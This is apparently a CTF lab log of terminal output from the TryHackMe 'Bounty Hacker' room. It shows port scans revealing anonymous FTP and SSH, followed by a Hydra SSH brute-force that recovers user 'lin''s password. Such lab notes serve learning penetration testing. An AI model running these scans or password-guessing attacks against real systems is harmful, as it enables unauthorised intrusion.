@@ -1,0 +1,217 @@
+┌──(kali㉿kali)-[~/THM/Bounty_Hacker]
+└─$ rustscan -a 10.10.94.45                                                                              
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+Real hackers hack time ⌛
+
+[~] The config file is expected to be at "/home/kali/.rustscan.toml"
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
+Open 10.10.94.45:21
+Open 10.10.94.45:22
+Open 10.10.94.45:80
+[~] Starting Script(s)
+[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
+
+[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-04 06:21 EST
+Initiating Ping Scan at 06:21
+Scanning 10.10.94.45 [2 ports]
+Completed Ping Scan at 06:21, 0.22s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 06:21
+Completed Parallel DNS resolution of 1 host. at 06:21, 0.01s elapsed
+DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating Connect Scan at 06:21
+Scanning 10.10.94.45 [3 ports]
+Discovered open port 22/tcp on 10.10.94.45
+Discovered open port 21/tcp on 10.10.94.45
+Discovered open port 80/tcp on 10.10.94.45
+Completed Connect Scan at 06:21, 0.22s elapsed (3 total ports)
+Nmap scan report for 10.10.94.45
+Host is up, received syn-ack (0.22s latency).
+Scanned at 2022-03-04 06:21:44 EST for 1s
+
+PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds
+
+                                                              
+
+
+
+
+
+
+
+
+
+
+
+
+
+┌──(kali㉿kali)-[~/THM/Bounty_Hacker]
+└─$ rustscan -a 10.10.94.45                                                                                                                             130 ⨯
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+🌍HACK THE PLANET🌍
+
+[~] The config file is expected to be at "/home/kali/.rustscan.toml"
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
+Open 10.10.94.45:21
+Open 10.10.94.45:22
+[~] Starting Script(s)
+[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
+
+[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-04 06:11 EST
+Initiating Ping Scan at 06:11
+Scanning 10.10.94.45 [2 ports]
+Completed Ping Scan at 06:11, 0.22s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 06:11
+Completed Parallel DNS resolution of 1 host. at 06:11, 0.00s elapsed
+DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating Connect Scan at 06:11
+Scanning 10.10.94.45 [2 ports]
+Discovered open port 21/tcp on 10.10.94.45
+Discovered open port 22/tcp on 10.10.94.45
+Completed Connect Scan at 06:11, 0.22s elapsed (2 total ports)
+Nmap scan report for 10.10.94.45
+Host is up, received syn-ack (0.22s latency).
+Scanned at 2022-03-04 06:11:44 EST for 0s
+
+PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack
+22/tcp open  ssh     syn-ack
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds
+
+
+ ##############################################################################
+┌──(kali㉿kali)-[~/THM/Bounty_Hacker]
+└─$ nmap -sV -sC -A  10.10.94.45 -p 21,22,80
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-04 06:21 EST
+Nmap scan report for 10.10.94.45
+Host is up (0.22s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.9.1.34
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 5
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
+|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
+|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 40.05 seconds
+
+
+
+
+
+
+┌──(kali㉿kali)-[~/THM/Bounty_Hacker]
+└─$ nmap -sV -sC -A  10.10.94.45 -p 21,22,            
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-04 06:11 EST
+Nmap scan report for 10.10.94.45
+Host is up (0.32s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.9.1.34
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
+|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
+|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 34.71 seconds
+
+
+ ##############################################################################
+ ##############################################################################
+Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-04 06:29:31
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
+[DATA] attacking ssh://10.10.94.45:22/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[INFO] Testing if password authentication is supported by ssh://lin@10.10.94.45:22
+[INFO] Successful, password authentication is supported by ssh://10.10.94.45:22
+[ATTEMPT] target 10.10.94.45 - login "lin" - pass "rEddrAGON" - 1 of 26 [child 0] (0/0)
+[ATTEMPT] target 10.10.94.45 - login "lin" - pass "ReDdr4g0nSynd!cat3" - 2 of 26 [child 1] (0/0)
+[ATTEMPT] target 10.10.94.45 - login "lin" - pass "Dr@gOn$yn9icat3" - 3 of 26 [child 2] (0/0)
+[ATTEMPT] target 10.10.94.45 - login "lin" - pass "R3DDr46ONSYndIC@Te" - 4 of 26 [child 3] (0/0)
+[ATTEMPT] target 10.10.94.45 - login "lin" - pass "ReddRA60N" - 5 of 26 [child 4] (0/0)
+[ATTEMPT] target 10.10.94.45 - login "lin" - pass "R3dDrag0nSynd1c4te" - 6 of 26 [child 5] (0/0)
+[ATTEMPT] target 10.10.94.45 - login "lin" - pass "dRa6oN5YNDiCATE" - 7 of 26 [child 6] (0/0)
+[ATTEMPT] target 10.10.94.45 - login "lin" - pass "ReDDR4g0n5ynDIc4te" - 8 of 26 [child 7] (0/0)
+[ATTEMPT] target 10.10.94.45 - login "lin" - pass "R3Dr4gOn2044" - 9 of 26 [child 8] (0/0)
+[ATTEMPT] target 10.10.94.45 - login "lin" - pass "RedDr4gonSynd1cat3" - 10 of 26 [child 9] (0/0)
+[ATTEMPT] target 10.10.94.45 - login "lin" - pass "R3dDRaG0Nsynd1c@T3" - 11 of 26 [child 10] (0/0)
+[ATTEMPT] target 10.10.94.45 - login "lin" - pass "Synd1c4teDr@g0n" - 12 of 26 [child 11] (0/0)
+[ATTEMPT] target 10.10.94.45 - login "lin" - pass "reddRAg0N" - 13 of 26 [child 12] (0/0)
+[ATTEMPT] target 10.10.94.45 - login "lin" - pass "REddRaG0N5yNdIc47e" - 14 of 26 [child 13] (0/0)
+[ATTEMPT] target 10.10.94.45 - login "lin" - pass "Dra6oN$yndIC@t3" - 15 of 26 [child 14] (0/0)
+[ATTEMPT] target 10.10.94.45 - login "lin" - pass "4L1mi6H71StHeB357" - 16 of 26 [child 15] (0/0)
+[22][ssh] host: 10.10.94.45   login: lin   password: RedDr4gonSynd1cat3
+[STATUS] 16.00 tries/min, 16 tries in 00:01h, 10 to do in 00:01h, 16 active
+[STATUS] 8.00 tries/min, 16 tries in 00:02h, 10 to do in 00:02h, 16 active
+[STATUS] 5.33 tries/min, 16 tries in 00:03h, 10 to do in 00:02h, 16 active
+[STATUS] 4.00 tries/min, 16 tries in 00:04h, 10 to do in 00:03h, 16 active
+[STATUS] 3.20 tries/min, 16 tries in 00:05h, 10 to do in 00:04h, 16 active
+The session file ./hydra.restore was written. Type "hydra -R" to resume session.
+The session file ./hydra.restore was written. Type "hydra -R" to resume session.
+ ##############################################################################
